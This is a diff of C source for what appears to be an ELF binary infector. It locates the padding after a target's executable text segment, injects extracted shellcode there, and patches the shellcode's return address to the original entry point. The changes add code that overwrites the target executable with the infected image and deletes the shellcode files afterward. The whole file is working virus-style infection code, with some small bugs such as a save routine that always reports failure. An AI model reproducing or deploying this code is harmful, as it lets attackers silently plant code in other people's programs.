@@ -1,14 +1,18 @@
 #include "elffile.h"
 #include <bits/stdint-uintn.h>
 #include <elf.h>
+#include <errno.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
+#include <sys/types.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <stdbool.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
+
+#define DEBUG
 
 static int shellcode_patch_ret_address(struct Shellcode *this,  \
         Elf64_Addr addr)
@@ -16,9 +20,11 @@ static int shellcode_patch_ret_address(struct Shellcode *this,  \
     for(int i = 0; i < this->m_size; i++){
         if(*((uint8_t *)this->m_shellcode + i) == 0x55 &&       \
                 *((uint8_t *)this->m_shellcode + (i+1)) == 0x99){
+#ifdef DEBUG
             printf("signature found\n");
             printf("replacing address with entry point %lx\n",  \
                     addr);
+#endif
             char buffer[16];
             sprintf(buffer, "%lx", addr);
 
@@ -28,7 +34,11 @@ static int shellcode_patch_ret_address(struct Shellcode *this,  \
             return 0;
         }
     }
+
+#ifdef DEBUG
     printf("signature not found in shellcode\n");
+#endif
+
     return -1;
 }
 
@@ -37,6 +47,7 @@ static int shellcode_extract_section(Shellcode *this, int index)
     this->m_size = (this->m_elf->m_shdr[index].sh_size + 8);
     this->m_shellcode = malloc(sizeof(uint8_t) * this->m_size);
     if(this->m_shellcode == NULL){
+        fprintf(stderr, "memory allocation failed\n");
         goto err1;
     }
 
@@ -45,7 +56,50 @@ static int shellcode_extract_section(Shellcode *this, int index)
             m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
             [index].sh_size);
 
+    return 0;
+
 err1:
+    return -1;
+}
+
+static int target_save_file(Target *this)
+{
+    /* removing file */
+    if(remove(this->m_elf->m_filename) < 0)
+        goto err;
+
+    int out = open(this->m_elf->m_filename, O_WRONLY | O_CREAT  \
+            | O_TRUNC, 0x664);
+    if(out < 0){
+        goto err;
+    }
+
+    /* 
+     * this part is critical so, make sure every byte is written
+     * back to the new file
+     */
+    int size = this->m_elf->m_size;
+    ssize_t written = 0;
+    void *buffer = this->m_elf->m_map;
+
+    while(size != 0 && (written = write(out, buffer, size))     \
+        != 0){
+        if(written == -1){
+            if(errno == EINTR)
+                continue;
+
+#ifdef DEBUG
+            fprintf(stderr, "error writing to file\n");
+#endif
+            goto err;
+        }
+
+        size -= written;
+        buffer += written;
+    }
+
+    close(out);
+err:
     return -1;
 }
 
@@ -90,10 +144,23 @@ static void target_adjust_sections(Target *this, int parasite_size)
 static int target_find_free_space(Target *this, int parasite_size)
 {
     bool text_found = false;
-    for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
+
+#ifdef DEBUG
+    printf("program headers %d\n", this->m_elf->m_ehdr->e_phnum);
+#endif
+
+    for(int i = 0; i < this->m_elf->m_ehdr->e_phnum; i++){
+
+#ifdef DEBUG
+        printf("header number %d\n", i);
+#endif
+
         if(this->m_elf->m_phdr[i].p_type == PT_LOAD && this->   \
                 m_elf->m_phdr[i].p_flags == (PF_R | PF_X)){
-            printf("text segment found\n");
+
+#ifdef DEBUG
+            printf("%d text segment found\n", i);
+#endif
             this->text_filesize = this->m_elf->m_phdr[i].p_filesz;
             Elf64_Off text_start = this->m_elf->m_phdr[i].p_offset;
             this->text_end = text_start + this->text_filesize;
@@ -110,20 +177,17 @@ static int target_find_free_space(Target *this, int parasite_size)
             < parasite_size && text_found){
             this->available_freespace = this->m_elf->m_phdr[i]. \
                 p_offset - this->text_end;
+
+#ifdef DEBUG
             printf("segment found with a gap of %d\n", this->   \
                     available_freespace);
+#endif
             text_found = false;
-        } else {
-            fprintf(stderr, "failed to find free space to       \
-                    inject shellcode\n");
-            goto err;
+
         }
     }
 
     return 0;
-
-err:
-    return -1;
 }
 
 /* to get the .text section code from our shellcode */
@@ -157,13 +221,18 @@ static void elf_parse_headers(Elf *elf)
 static bool elf_is_elf(Elf *elf)
 {
     if(elf->m_map == NULL){
+
+#ifdef DEBUG
         fprintf(stderr, "file not mapped\n");
+#endif
         goto err;
     }
 
     if(elf->m_map[0] != 0x7f || elf->m_map[1] != 'E' ||         \
             elf->m_map[2] != 'L' || elf->m_map[3] != 'F'){
+#ifdef DEBUG
         fprintf(stderr, "not an elf binary\n");
+#endif
         goto err;
     }
 
@@ -176,19 +245,29 @@ err:
 static int elf_init_file(Elf *this)
 {
     if(this->m_filename == NULL){
+
+#ifdef DEBUG
         fprintf(stderr, "filename not specified\n");
+#endif
         goto err;
     }
 
+#ifdef DEBUG
+    printf("%s\n", this->m_filename);
+#endif
+
     int fd = open(this->m_filename, O_RDWR);
     if(fd < 0){
-        fprintf(stderr, "file open error");
+        puts(strerror(errno));
+        fprintf(stderr, "file open error\n");
         goto err;
     }
 
     struct stat st;
     if(fstat(fd, &st) < 0){
+#ifdef DEBUG
         fprintf(stderr, "fstat failed\n");
+#endif
         goto err1;
     }
 
@@ -196,7 +275,9 @@ static int elf_init_file(Elf *this)
     this->m_map =mmap(NULL, this->m_size, PROT_READ |PROT_WRITE \
         , MAP_PRIVATE, fd, 0);
     if(this->m_map == MAP_FAILED){
+#ifdef DEBUG
         fprintf(stderr, "memory map failed");
+#endif
         goto err1;
     }
 
@@ -214,7 +295,9 @@ Elf *ElfConstructor(const char *filename)
 {
     Elf *elf = malloc(sizeof(Elf));
     if(elf == NULL){
+#ifdef DEBUG
         fprintf(stderr, "memory allocation failed\n");
+#endif
         goto err;
     }
 
@@ -238,7 +321,9 @@ void ElfDestructor(Elf *this)
 {
     if(this->m_map != NULL){
         if(munmap(this->m_map, this->m_size) < 0){
+#ifdef DEBUG
             fprintf(stderr, "memory unmap failed\n");
+#endif
         }
         this->m_map = NULL;
     }
@@ -250,7 +335,9 @@ Target *TargetConstructor(const char *filename)
 {
     Target *target = malloc(sizeof(Target));
     if(target == NULL){
+#ifdef DEBUG
         fprintf(stderr, "memory allocation error\n");
+#endif
         goto err;
     }
 
@@ -271,6 +358,7 @@ Target *TargetConstructor(const char *filename)
     target->TargetFindFreeSpace = target_find_free_space;
     target->TargetAdjustSections = target_adjust_sections;
     target->TargetInsertShellcode = target_insert_shellcode;
+    target->TargetSaveFile = target_save_file;
 
     return target;
 
@@ -281,16 +369,12 @@ err1:
     free(target);
 
 err:
-    return target;
+    return NULL;
 }
 
 void TargetDestructor(Target *this)
 {
-    /*
-     * rm target file
-     * write mapped memory region to a new file with same name
-     * un map memory
-     */
+    this->TargetSaveFile(this);
     ElfDestructor(this->m_elf);
     free(this);
 }
@@ -299,7 +383,9 @@ Shellcode *ShellcodeConstructor(const char *filename)
 {
     Shellcode *shellcode = malloc(sizeof(Shellcode));
     if(shellcode == NULL){
+#ifdef DEBUG
         fprintf(stderr, "memory allocation error\n");
+#endif
         goto err;
     }
 
@@ -329,12 +415,22 @@ err1:
     free(shellcode);
 
 err:
-    return shellcode;
+    return NULL;
 }
 
 void ShellcodeDestructor(Shellcode *this)
 {
     /* remove shellcode files */
+    if(remove(this->m_elf->m_filename) < 0){
+#ifdef DEBUG
+        fprintf(stderr, "failed to remove file\n");
+#endif
+        goto err;
+    }
+
     ElfDestructor(this->m_elf);
     free(this);
+
+err:
+    return;
 }
